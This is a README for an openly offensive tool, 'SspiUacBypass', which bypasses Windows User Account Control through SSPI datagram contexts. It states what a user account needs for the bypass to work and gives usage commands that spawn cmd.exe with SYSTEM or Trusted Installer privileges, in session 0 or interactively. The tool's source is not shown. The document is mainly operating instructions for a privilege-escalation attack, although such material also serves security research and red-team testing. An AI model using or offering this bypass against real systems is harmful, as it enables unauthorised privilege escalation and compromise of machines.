# SspiUacBypass
Bypassing UAC with SSPI Datagram Contexts 

Full technical details at --> https://splintercod3.blogspot.com/p/bypassing-uac-with-sspi-datagram.html

# Requirements for the bypass to works

- The user must belongs to the local *Administrators* group *(needed to open the SCM)*
- The user must have a password set 
*(Windows security policy prevents accounts with blank passwords from establishing network authentication contexts, causing the AcceptSecurityContext function to fail with SEC_E_LOGON_DENIED because the system cannot generate valid security tokens for passwordless accounts during network logon attempts.)*


# Usage

Run a command using SYSTEM privileges

**Note**: By default, as the program will be executed by a service, it will spawn on Session 0 which is isolated from your current session.

```
SspiUacBypass.exe  c:\windows\system32\cmd.exe
SspiUacBypass.exe  cmd.exe
SspiUacBypass.exe  "cmd.exe /k dir %windir%\System32"
```

Run a command using SYSTEM privileges **(Interactive)**

**Note**: Using the *-i* argument, the process will spawn on your current Session and Desktop *(winsta0\\default)*

```
SspiUacBypass.exe  -i c:\windows\system32\cmd.exe
```

Run a command using Trusted Installer Privileges

**Note**: Using the *-t* argument, *SspiUacBypass.exe* will try to start the **Trusted Installer service**, get its token, duplicate it and use it to spawn the process using the same privileges as *Trusted Installer*.

```
SspiUacBypass.exe  -t c:\windows\system32\cmd.exe
```


Run a command using Trusted Installer Privileges **(Interactive)**

**Note**: You can use both arguments at the same time. The process will spawn in the current user desktop with *Trusted Installer* privileges.

```
SspiUacBypass.exe  -i -t c:\windows\system32\cmd.exe
```